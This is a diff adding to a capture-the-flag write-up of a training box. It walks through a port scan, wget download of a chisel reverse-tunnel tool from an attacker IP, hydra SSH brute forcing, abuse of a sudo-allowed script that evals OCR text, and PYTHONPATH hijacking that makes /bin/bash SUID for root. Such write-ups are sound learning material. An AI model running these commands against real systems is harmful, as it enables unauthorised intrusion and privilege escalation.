@@ -248,3 +248,246 @@ Only one was cracked (testing)
 ```
 pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=:lala12345
 ```
+
+Check for open ports
+
+```
+nc -zv 172.17.0.1 1-65535
+
+ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 5003 (?) open
+ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 22 (ssh) open
+```
+
+## Access internal port (Chisel)
+
+```
+# Transfer chisel over
+wget http://10.8.153.120:9988/chisel
+
+# Start a server our side for port 22
+sudo ./chisel server -p 1880 --reverse
+ 
+# Start a clint on the attacking box
+./chisel client10.10.236.3:1880 R:22:172.17.0.1:22
+```
+
+## Access to internal SSH
+
+```
+ hydra -l ramsey  -P /usr/share/wordlists/rockyou.txt -s 22 -f ssh://127.0.0.1 
+[22][ssh] host: 127.0.0.1   login: ramsey   password: 12345678
+```
+
+## SSH
+
+```
+ssh ramsey@127.0.0.1
+12345678
+```
+
+```
+ramsey@unbaked:~$ cat user.txt 
+THM{ce778dd41bec31e1daed77ebebcd7423}
+ramsey@unbaked:~$ 
+```
+
+## Oliver
+
+```
+sudo -l
+(oliver) /usr/bin/python /home/ramsey/vuln.py
+
+sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
+```
+
+Found a few files in home dir. 
+
+```
+payload.png  user.txt  vuln.py
+```
+
+vuln.py
+
+```
+#!/usr/bin/python
+# coding=utf-8
+
+try:
+    from PIL import Image
+except ImportError:
+    import Image
+import pytesseract
+import sys
+import os
+import time
+
+
+#Header
+def header():
+        banner = '''\033[33m                                             
+                                      (
+                                       )
+                                  __..---..__
+                              ,-='  /  |  \  `=-.
+                             :--..___________..--;
+                              \.,_____________,./
+                 
+
+██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
+██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
+██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
+██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
+██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
+╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
+\033[m'''
+        return banner
+
+#Function Instructions
+def instructions():
+        print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
+        print "\t\t\t","1. Calculator"
+        print "\t\t\t","2. Easy Calculator"
+        print "\t\t\t","3. Credits"
+        print "\t\t\t","4. Exit"
+        print "\t\t\t",28 * "-"
+
+def instructions2():
+        print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
+        print "\t\t\t","1. Add"
+        print "\t\t\t","2. Subtract"
+        print "\t\t\t","3. Multiply"
+        print "\t\t\t","4. Divide"
+        print "\t\t\t","5. Back"
+        print "\t\t\t",28 * "-"
+
+def credits():
+        print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"
+
+# Function Arithmetic
+
+# Function to add two numbers  
+def add(num1, num2): 
+    return num1 + num2 
+  
+# Function to subtract two numbers  
+def subtract(num1, num2): 
+    return num1 - num2 
+  
+# Function to multiply two numbers 
+def multiply(num1, num2): 
+    return num1 * num2 
+  
+# Function to divide two numbers 
+def divide(num1, num2): 
+    return num1 / num2 
+# Main    
+if __name__ == "__main__":
+        print header()
+
+        #Variables
+        OPTIONS = 0
+        OPTIONS2 = 0
+        TOTAL = 0
+        NUM1 = 0
+        NUM2 = 0
+
+        while(OPTIONS != 4):
+                instructions()
+                OPTIONS = int(input("\t\t\tEnter Options >> "))
+                print "\033c"
+                if OPTIONS == 1:
+                        instructions2()
+                        OPTIONS2 = int(input("\t\t\tEnter Options >> "))
+                        print "\033c"
+                        if OPTIONS2 == 5:
+                                continue
+                        else:
+                                NUM1 = int(input("\t\t\tEnter Number1 >> "))
+                                NUM2 = int(input("\t\t\tEnter Number2 >> "))
+                                if OPTIONS2 == 1:
+                                        TOTAL = add(NUM1,NUM2)
+                                if OPTIONS2 == 2:
+                                        TOTAL = subtract(NUM1,NUM2)
+                                if OPTIONS2 == 3:
+                                        TOTAL = multiply(NUM1,NUM2)
+                                if OPTIONS2 == 4:
+                                        TOTAL = divide(NUM1,NUM2)
+                                print "\t\t\tTotal >> $",TOTAL
+                if OPTIONS == 2:
+                        animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
+
+                        print "\r\t\t\t     Waiting to extract..."
+                        for i in range(len(animation)):
+                            time.sleep(0.5)
+                            sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])
+                            sys.stdout.flush()
+
+                        LISTED = pytesseract.image_to_string(Image.open('payload.png')) 
+
+                        TOTAL = eval(LISTED)
+                        print "\n\n\t\t\tTotal >> $",TOTAL
+                if OPTIONS == 3:
+                        credits()
+        sys.exit(-1)
+```
+
+If we can delete the vuln.py file and add in  ```import os; os.system('/bin/bash')```
+We should get a new shell as oliver. 
+
+```
+sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
+
+oliver@unbaked:~$ id
+uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
+```
+
+## Root
+
+```
+User oliver may run the following commands on unbaked:
+    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
+```
+
+Looking at the file we can see if we make a new script called docker.py in the home directory of oliver we can gain access. 
+
+/opt/dockerscript.py
+
+```
+import docker
+
+# oliver, make sure to restart docker if it crashes or anything happened.
+# i havent setup swap memory for it
+# it is still in development, please dont let it live yet!!!
+client = docker.from_env()
+client.containers.run("python-django:latest", "sleep infinity", detach=True)
+```
+
+import docker being a vunerable command. 
+
+docker.py 
+
+```
+import os
+
+os.system('chmod 4777 /bin/bash')
+```
+
+```
+sudo PYTHONPATH=`pwd` /usr/bin/python /opt/dockerScript.py
+```
+
+```
+oliver@unbaked:/home/oliver$ /bin/bash -p
+bash-4.3# id
+uid=1002(oliver) gid=1002(oliver) euid=0(root) groups=1002(oliver),1003(sysadmin)
+bash-4.3# cd /root
+bash-4.3# ls
+root.txt
+bash-4.3# cat root.txt 
+CONGRATS ON PWNING THIS BOX!
+Created by ch4rm & H0j3n
+ps: dont be mad us, we hope you learn something new
+
+flag: THM{1ff4c893b3d8830c1e188a3728e90a5f}
+bash-4.3# 
+```
